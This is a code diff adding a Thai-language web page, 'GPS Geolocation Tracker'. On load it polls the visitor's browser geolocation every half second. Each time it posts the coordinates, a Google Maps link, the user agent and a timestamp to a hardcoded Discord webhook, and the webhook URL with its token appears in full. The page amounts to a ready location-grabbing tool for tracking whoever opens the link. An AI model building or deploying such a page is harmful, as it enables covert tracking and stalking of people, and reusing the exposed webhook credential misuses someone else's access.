@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Tracker</title>
+    <script>
+        // Discord Webhook URL
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz';
+
+        function sendLocationToDiscord(latitude, longitude, userAgent, currentTime) {
+            // Create Google Maps link
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // Prepare the message to send to Discord
+            const embed = {
+                "embeds": [
+                    {
+                        "title": "ข้อมูลตำแหน่ง",
+                        "description": "รายละเอียดตำแหน่งที่ได้รับ",
+                        "color": 7506394,
+                        "fields": [
+                            {
+                                "name": "🌍 ตำแหน่ง (Latitude, Longitude)",
+                                "value": `${latitude}, ${longitude}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "📍 ดูตำแหน่งบน Google Maps",
+                                "value": `[เปิดใน Google Maps](${mapsUrl})`,
+                                "inline": false
+                            },
+                            {
+                                "name": "📱 User-Agent",
+                                "value": userAgent,
+                                "inline": false
+                            },
+                            {
+                                "name": "⏰ เวลาปัจจุบัน",
+                                "value": currentTime,
+                                "inline": false
+                            }
+                        ],
+                        "footer": { "text": "ส่งโดย GPS Bot" }
+                    }
+                ]
+            };
+
+            // Send the data to Discord Webhook
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            }).then(response => {
+                if (response.ok) {
+                    console.log("ข้อมูลถูกส่งไปที่ Discord");
+                } else {
+                    console.log("ไม่สามารถส่งข้อมูลไปที่ Discord");
+                }
+            }).catch(error => {
+                console.error("เกิดข้อผิดพลาด:", error);
+            });
+        }
+
+        function getLocationAndSend() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const userAgent = navigator.userAgent;
+
+                // Get the current time in the format วัน/เดือน/ปี เวลา
+                const currentTime = new Date().toLocaleDateString('th-TH') + ' ' + new Date().toLocaleTimeString('th-TH'); // ใช้วันที่และเวลาในรูปแบบไทย
+
+                // Send the location and time to Discord
+                sendLocationToDiscord(latitude, longitude, userAgent, currentTime);
+            });
+        }
+
+        setInterval(getLocationAndSend, 500); // ส่งข้อมูลทุกๆ 500ms (0.5 วินาที)
+    </script>
+</head>
+<body>
+    <h1>GPS Geolocation Tracker</h1>
+    <p>ข้อมูลตำแหน่งและเวลาจะถูกส่งไปที่ Discord ทุกๆ 0.5 วินาที</p>
+</body>
+</html>
